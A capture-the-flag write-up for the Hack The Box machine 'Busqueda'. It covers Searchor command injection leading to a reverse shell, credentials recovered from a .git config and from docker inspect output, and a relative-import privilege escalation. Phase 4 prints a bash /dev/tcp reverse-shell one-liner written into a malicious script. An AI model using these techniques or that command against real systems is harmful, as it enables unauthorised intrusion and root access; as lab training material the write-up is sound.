# HTB Write-Up: Busqueda
## Phase 1: Reconnaissance
We begin by scanning for open ports and services using `nmap`.
**Command:**
```bash
nmap -sC -sV -oA scan 10.10.11.208
```

**Result:**  
Port 80 (HTTP) is open.

![image](https://github.com/user-attachments/assets/8fc185e7-3198-414b-b266-751ad3519205)

---
## Phase 2: Enumeration & Discovery

### Web Enumeration
Navigating to `http://10.10.11.208` in a browser returns an error. We resolve this by editing our `/etc/hosts` file to associate the domain with the target IP:

![image](https://github.com/user-attachments/assets/0eb0daca-34ab-417a-8491-7742b45c57e3)

![image](https://github.com/user-attachments/assets/ac9201b7-e62e-4030-be50-87a8c27f8b13)

With the host entry in place, the site loads successfully.

![image](https://github.com/user-attachments/assets/46c463bb-b153-419f-bfa3-ecef2f7cac91)

When submitting a search request, we can observe the URL being queried.

![image](https://github.com/user-attachments/assets/76a52cae-8911-4321-a094-9f5ad32c1914)

From the page footer and behavior, we identify two technologies in use:
- **Flask**
- **Searchor 2.4.0**

Researching Searchor 2.4.0 reveals a known **command injection vulnerability**. A proof of concept is publicly available:

[GitHub - Searchor 2.4.0 Exploit](https://github.com/nikn0laty/Exploit-for-Searchor-2.4.0-Arbitrary-CMD-Injection)

![image](https://github.com/user-attachments/assets/b6d56657-2d63-4878-97c5-e94f68ac247f)

We use `wget` to download the exploit:

![image](https://github.com/user-attachments/assets/fc1f7cb0-fd9b-405a-a49f-d6a373255c10)

Start a listener on our machine:

![image](https://github.com/user-attachments/assets/3f0fdc3b-02ca-40ad-a836-776693a0347e)

Grant execute permissions and run the exploit using the domain and our attacker's IP:

![image](https://github.com/user-attachments/assets/74be9cc9-3f19-4455-989d-867f6e0fbc32)

This gives us a reverse shell on the target system:

![image](https://github.com/user-attachments/assets/753e3afe-a95e-447c-9e01-a83184551077)

We retrieve the user flag:

**Path:**
```
/home/svc/user.txt
```

![image](https://github.com/user-attachments/assets/0a13b7b5-33f9-453f-b301-55dcad57c44e)

---
## Phase 3: Privilege Escalation
### Attempted Enumeration
We try to view sudo privileges:
```bash
sudo -l
```

Access is denied.

![image](https://github.com/user-attachments/assets/2e02bc83-475b-4628-8c46-6dfe33422545)

We search for binaries with the SUID/SGID bit set:
```bash
find / -perm -4000 -type f 2>/dev/null
```

![image](https://github.com/user-attachments/assets/ebbbc95a-7aa6-4c3c-ba95-45b44dad9f10)

We check capabilities, but nothing here:
```bash
getcap -r / 2>/dev/null
```

![image](https://github.com/user-attachments/assets/a4cf14b9-2ae1-45cf-8834-87ccc40d0d7d)


### Git Enumeration
We search for Git repositories:
```bash
find / -type d -name ".git" 2>/dev/null
```

Inside one `.git` directory, we find a `config` file containing credentials:

![image](https://github.com/user-attachments/assets/69858c63-de51-4ee0-b46f-15f92bf9d0be)

Extracted Credentials:
```
Username: cody  
Password: jh1usoih2bkjaspwe92
```

The config references the domain: `gitea.searcher.htb`

Since port 22 (SSH) is open, we attempt an SSH login with the `svc` user:

![image](https://github.com/user-attachments/assets/d1b56848-989c-4c19-a7dd-4ef9721d23d6)

We successfully authenticate with the password. Running `sudo -l` now reveals two scripts executable as sudo:

![image](https://github.com/user-attachments/assets/f70cf5ab-96f5-4ad9-94b3-c91edd1a5055)

We cannot modify them, but we have **execute permissions**.

![image](https://github.com/user-attachments/assets/39da5932-a3c6-42ad-93ef-7ace538fd191)

Running one of the scripts shows a help menu — it's used for interacting with Docker containers:

![image](https://github.com/user-attachments/assets/a0c2646d-6621-4ae6-ba96-6c4e3a094ec6)

Docker supports Go templates to customize output. Using the `{{json .}}` template with `docker inspect`, we can print the full JSON data of a container.

To parse the JSON, we use `jq`, which is already installed.

Executing the script with this template reveals environment variables, including **Gitea credentials**.

![image](https://github.com/user-attachments/assets/0735fdcd-dc6f-4130-be49-d531b9c705f4)

We find a username and password in the `Config` section:

![image](https://github.com/user-attachments/assets/f2ecce0c-341e-47bb-88ff-edeb1fdad676)

---
## Phase 4: Gitea Exploitation to Root
We revisit the Gitea domain by adding it to our `/etc/hosts`:

![image](https://github.com/user-attachments/assets/6d512dab-6402-4870-a6d1-df2fab041d8b)

We log in with the discovered administrator credentials.

![image](https://github.com/user-attachments/assets/ef3457a6-6dfb-4125-83a4-e77e07f83529)

Inside a repository, we find `system-checkup.py` referencing `full-checkup.py` via a **relative path**.

![image](https://github.com/user-attachments/assets/9dbe9d02-a8bb-4a95-a5fd-b7d715c0002a)

We confirm that we can execute the `full-checkup.py` script from `/opt/scripts`.

![image](https://github.com/user-attachments/assets/fae10a48-2f09-4858-aeca-76664884f045)

It worked! This implies we can exploit the relative import by placing a malicious `full-checkup.py` script in the same directory from which we call `system-checkup.py`.

We create a malicious version that spawns a root shell:
```bash
echo 'import os; os.system("bash -i >& /dev/tcp/<attacker-ip>/<port> 0>&1")' > /tmp/full-checkup.py
chmod +x /tmp/full-checkup.py
```

![image](https://github.com/user-attachments/assets/dd628697-27e8-4a2c-88ee-79a89e4e865d)

We start a nc listener:

![image](https://github.com/user-attachments/assets/87032c76-4fef-4927-a7f0-44675682646f)

Run `system-checkup.py` from `/tmp`, where our malicious `full-checkup.py` resides:

![image](https://github.com/user-attachments/assets/95599fa7-ac1c-4886-8959-ccef204fe3af)

We receive a shell as root.

![image](https://github.com/user-attachments/assets/eae897aa-6381-4c37-afda-e72adc2ea3d7)

Retrieve the root flag from:
```
/root/root.txt
```

![image](https://github.com/user-attachments/assets/b073860b-14e9-452e-a250-4e34a91c9ce7)

